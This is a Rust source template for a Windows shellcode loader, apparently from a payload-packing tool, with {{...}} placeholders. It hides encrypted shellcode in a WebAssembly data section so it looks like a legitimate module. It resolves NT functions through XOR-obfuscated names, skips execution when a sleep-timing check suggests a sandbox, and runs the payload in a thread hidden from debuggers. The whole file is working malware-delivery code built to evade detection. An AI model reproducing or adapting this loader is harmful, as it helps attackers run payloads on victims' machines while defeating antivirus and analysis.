#![windows_subsystem = "windows"]
#![allow(non_snake_case, non_camel_case_types)]
{{LITCRYPT_SETUP}}
{{COMMON_MODULE}}
use std::ffi::CString;
use std::include_bytes;
use std::ptr::null_mut;
use winapi::{
    um::{
        winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ, THREAD_ALL_ACCESS},
        libloaderapi::{GetModuleHandleA, GetProcAddress},
    },
    shared::ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS},
    ctypes::c_void,
};
use std::time::Instant;

{{IMPORTS}}
{{SANDBOX_IMPORTS}}
{{DECRYPTION_FUNCTION}}

// Hide the created thread from debuggers, matching the ntCRT/ntStomp
// convention.
const HIDE_FROM_DEBUGGER: u32 = 0x4;

const K: u8 = {{API_KEY}};
const OBF_B: &[u8] = &{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}};
const OBF_D: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};
const OBF_E: &[u8] = &{{OBF_NT_CREATE_THREAD_EX}};
const OBF_H: &[u8] = &{{OBF_NT_DELAY_EXECUTION}};

fn r(d: &[u8]) -> Vec<u8> {
    d.iter().map(|b| b ^ K).collect()
}

unsafe fn g(n: &[u8]) -> *const () {
    let ntdll = CString::new(lc!("ntdll")).unwrap();
    let h = GetModuleHandleA(ntdll.as_ptr());
    let s = r(n);
    let c = CString::new(s).unwrap();
    GetProcAddress(h, c.as_ptr()) as *const ()
}

type FB = unsafe extern "system" fn(HANDLE, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
type FD = unsafe extern "system" fn(HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
type FE = unsafe extern "system" fn(*mut HANDLE, u32, *mut c_void, HANDLE, *mut c_void, *mut c_void, u32, usize, usize, usize, *mut c_void) -> i32;
type FH = unsafe extern "system" fn(u32, *const i64) -> i32;

fn pause(ms: i64) {
    unsafe {
        let f: FH = std::mem::transmute(g(OBF_H));
        let interval: i64 = -(ms * 10_000);
        f(0, &interval);
    }
}

fn check_environment() -> bool {
    let start = Instant::now();
    pause(3000);
    start.elapsed().as_millis() >= 2500
}

// Read an unsigned LEB128 integer from `buf` at position `pos`, advancing
// `pos` past the consumed bytes.
fn read_uleb(buf: &[u8], pos: &mut usize) -> Option<u64> {
    let mut result: u64 = 0;
    let mut shift = 0;
    loop {
        let byte = *buf.get(*pos)?;
        *pos += 1;
        result |= ((byte & 0x7f) as u64) << shift;
        if byte & 0x80 == 0 {
            break;
        }
        shift += 7;
    }
    Some(result)
}

// Extract the first active data segment from a WebAssembly binary.
//
// The ntWat template embeds the (encrypted) shellcode as a wasm data section
// rather than as raw ciphertext: the payload is generated from a WAT text
// source at pack time, which keeps the embedded blob low-entropy and makes it
// look like a legitimate wasm module. At runtime this reader walks the binary
// by hand (no wasm runtime dependency, so the loader cross-compiles cleanly)
// and returns the segment's bytes, which are then handed to the normal
// decryption routine.
fn extract_wasm_data(wasm: &[u8]) -> Option<Vec<u8>> {
    // wasm magic (\0asm) + version = 8 bytes
    if wasm.len() < 8 {
        return None;
    }
    let mut pos = 8;
    while pos < wasm.len() {
        let section_id = wasm[pos];
        pos += 1;
        let section_len = read_uleb(wasm, &mut pos)? as usize;
        let section_end = pos + section_len;
        // Section 11 (0x0B) is the data section.
        if section_id == 0x0B {
            let count = read_uleb(wasm, &mut pos)? as usize;
            for _ in 0..count {
                let seg_kind = wasm[pos];
                pos += 1;
                if seg_kind == 0 {
                    // Active segment: const-expr is `i32.const <offset> end`.
                    if wasm[pos] != 0x41 {
                        return None;
                    }
                    pos += 1;
                    let _offset = read_uleb(wasm, &mut pos)?;
                    if wasm[pos] != 0x0B {
                        return None;
                    }
                    pos += 1;
                    let data_len = read_uleb(wasm, &mut pos)? as usize;
                    let data = wasm[pos..pos + data_len].to_vec();
                    return Some(data);
                } else if seg_kind == 1 {
                    // Passive segment: skip its payload.
                    let data_len = read_uleb(wasm, &mut pos)? as usize;
                    pos += data_len;
                    continue;
                } else if seg_kind == 2 {
                    // Active segment with an explicit memory index.
                    let _mem_idx = read_uleb(wasm, &mut pos)?;
                    if wasm[pos] != 0x41 {
                        return None;
                    }
                    pos += 1;
                    let _offset = read_uleb(wasm, &mut pos)?;
                    if wasm[pos] != 0x0B {
                        return None;
                    }
                    pos += 1;
                    let data_len = read_uleb(wasm, &mut pos)? as usize;
                    let data = wasm[pos..pos + data_len].to_vec();
                    return Some(data);
                }
            }
            return None;
        }
        pos = section_end;
    }
    None
}

fn main() {
    {{SANDBOX}}
    if !check_environment() {
        return;
    }

    // The encrypted shellcode is wrapped in a WebAssembly module: read the
    // wasm data section back out, then decrypt in place with the normal
    // encryption pipeline.
    let wasm = include_bytes!({{PATH_TO_WASM}});
    let mut vec: Vec<u8> = match extract_wasm_data(wasm) {
        Some(d) => d,
        None => return,
    };
    {{MAIN}}

    unsafe {
        let f_alloc: FB = std::mem::transmute(g(OBF_B));
        let f_protect: FD = std::mem::transmute(g(OBF_D));
        let f_thread: FE = std::mem::transmute(g(OBF_E));

        let current_process: HANDLE = -1isize as HANDLE;
        let mut base: *mut c_void = null_mut();
        let mut size: usize = vec.len();
        let s = f_alloc(
            current_process,
            &mut base,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if !NT_SUCCESS(s) {
            return;
        }
        pause(150);

        let buf_len = vec.len();
        std::ptr::copy_nonoverlapping(vec.as_ptr(), base as *mut u8, buf_len);
        common::wipe(&mut vec);

        pause(150);
        let mut old_protect: u32 = 0;
        let mut region_size = buf_len;
        let _ = f_protect(
            current_process,
            &mut base,
            &mut region_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        pause(100);
        let mut th: HANDLE = null_mut();
        f_thread(
            &mut th,
            THREAD_ALL_ACCESS,
            null_mut(),
            current_process,
            base,
            null_mut(),
            HIDE_FROM_DEBUGGER,
            0,
            0,
            0,
            null_mut(),
        );

        if !th.is_null() {
            pause(60_000);
        }
    }
}
{{DLL_MAIN}}
